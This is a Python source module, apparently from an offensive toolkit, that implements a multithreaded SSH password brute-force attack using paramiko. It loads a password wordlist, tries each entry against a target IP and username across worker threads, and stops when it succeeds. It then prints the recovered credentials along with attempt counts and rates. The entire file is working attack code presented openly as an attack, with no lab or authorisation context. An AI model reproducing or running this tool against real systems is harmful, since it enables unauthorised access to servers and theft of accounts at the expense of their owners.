# SSH Brute Force 

from .progress import ProgressUpdater
import os
import time
from threading import Thread, Lock, Event
from queue import Queue, Empty
import paramiko
import socket
from .. import config as conf

class SSHBruteForcer:
    def __init__(self, timeout=3, max_retries=1):
        self.timeout = timeout
        self.max_retries = max_retries
    
    def try_ssh(self, ip, username, password):
        """Test SSH connection with improved error handling"""
        for attempt in range(self.max_retries + 1):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                client.connect(
                    hostname=ip,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
                return True
                
            except paramiko.AuthenticationException:
                return False
            except (socket.timeout, socket.error):
                if attempt < self.max_retries:
                    time.sleep(0.5)
                    continue
                return False
            except Exception:
                return False
            finally:
                try:
                    client.close()
                except:
                    pass
        
        return False
    
    def brute_force_threaded(self, ip, username, passwords, threads=10, delay=0.1):
        """Optimized threaded brute force"""
        password_queue = Queue()
        for pwd in passwords:
            password_queue.put(pwd)
        
        result = {"found": False, "credential": None}
        attempts = {"count": 0}
        locks = {"result": Lock(), "attempts": Lock()}
        stop_event = Event()
        
        updater = ProgressUpdater(len(passwords))
        updater.start()
        
        def worker():
            while not stop_event.is_set():
                try:
                    password = password_queue.get_nowait()
                except Empty:
                    break
                
                if stop_event.is_set():
                    break
                
                success = self.try_ssh(ip, username, password)
                updater.increment()
                
                with locks["attempts"]:
                    attempts["count"] += 1
                
                if success:
                    with locks["result"]:
                        if not result["found"]:
                            result["found"] = True
                            result["credential"] = f"{username}:{password}"
                            stop_event.set()
                    break
                
                time.sleep(delay)
        
        # Start worker threads
        thread_list = []
        for _ in range(min(threads, len(passwords))):
            t = Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)
        
        # Wait for completion
        for t in thread_list:
            t.join()
        
        updater.stop()
        return result["credential"], attempts["count"]

def load_passwords(password_file, base_dir=None):
    """Load passwords from file"""
    tool_dir = os.path.dirname(__file__)
    modules_dir = os.path.dirname(tool_dir)
    
    if os.path.isabs(password_file):
        password_path = password_file
    else:
        password_path = os.path.join(modules_dir, password_file)
    
    if not os.path.isfile(password_path):
        print(f"{conf.RED}[!] Password file not found: {password_path}{conf.RESET}")
        return None
    
    try:
        with open(password_path, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except Exception as e:
        print(f"{conf.RED}[!] Error reading password file: {e}{conf.RESET}")
        return None

def BruteForceSsh(ip, username, passwordFile, baseDir=None, delay=0.1):
    """Main SSH brute force function"""
    print(f"\n{conf.PURPLE}┌─ SSH Brute Force Attack{conf.RESET}")
    print(f"{conf.PURPLE}├─ Target: {conf.BOLD}{ip}{conf.RESET}")
    print(f"{conf.PURPLE}├─ Username: {conf.BOLD}{username}{conf.RESET}")
    print(f"{conf.PURPLE}└─ Starting attack...{conf.RESET}\n")
    
    # Load passwords
    passwords = load_passwords(passwordFile, baseDir)
    if not passwords:
        return None
    
    print(f"{conf.YELLOW}[i] Loaded {len(passwords)} passwords{conf.RESET}")
    
    # Initialize brute forcer
    brute_forcer = SSHBruteForcer()
    start_time = time.time()
    
    # Execute attack
    result, attempts = brute_forcer.brute_force_threaded(ip, username, passwords, delay=delay)
    
    # Calculate results
    duration = round(time.time() - start_time, 2)
    rate = round(attempts / duration, 2) if duration > 0 else 0
    
    # Display results
    print(f"\n{conf.PURPLE}┌─ Attack Results{conf.RESET}")
    print(f"{conf.PURPLE}├─ Duration: {conf.RESET}{duration}s")
    print(f"{conf.PURPLE}├─ Attempts: {conf.RESET}{attempts}/{len(passwords)}")
    print(f"{conf.PURPLE}├─ Rate: {conf.RESET}{rate} attempts/sec")
    
    if result:
        print(f"{conf.PURPLE}└─ Status: {conf.GREEN}SUCCESS ✓{conf.RESET}")
        print(f"\n{conf.GREEN}[+] Valid credentials found: {conf.BOLD}{result}{conf.RESET}")
    else:
        print(f"{conf.PURPLE}└─ Status: {conf.RED}FAILED ✗{conf.RESET}")
        print(f"\n{conf.RED}[-] No valid credentials found{conf.RESET}")
    
    return {
        "ip": ip,
        "username": username,
        "passwordFile": os.path.basename(passwordFile),
        "totalPasswords": len(passwords),
        "totalAttempts": attempts,
        "duration": duration,
        "result": result if result else "not found"
    }

# Backward compatibility functions
def TrySsh(ip, username, password):
    """Legacy function for compatibility"""
    brute_forcer = SSHBruteForcer()
    return brute_forcer.try_ssh(ip, username, password)

def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
    """Legacy function for compatibility"""
    brute_forcer = SSHBruteForcer()
    return brute_forcer.brute_force_threaded(ip, username, passwords, threadCount, delay)